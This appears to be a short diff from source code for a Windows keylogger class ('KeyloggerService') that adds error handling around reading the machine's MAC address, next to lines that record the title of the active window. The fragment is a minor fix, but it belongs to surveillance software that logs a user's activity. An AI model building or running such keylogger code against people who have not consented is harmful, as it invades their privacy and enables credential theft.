@@ -46,7 +46,10 @@ class KeyloggerService:
 
     def __add_to_data(self, dictionary: dict, data: str):
         current_time = self.__current_time()
-        current_mac_address = get_mac_address()
+        try:
+            current_mac_address = get_mac_address()
+        except:
+            current_mac_address = "not was in enternet"
         current_app_1 = win32gui.GetForegroundWindow()
         current_app = win32gui.GetWindowText(current_app_1)
         self.current_app = rf"{current_app}"
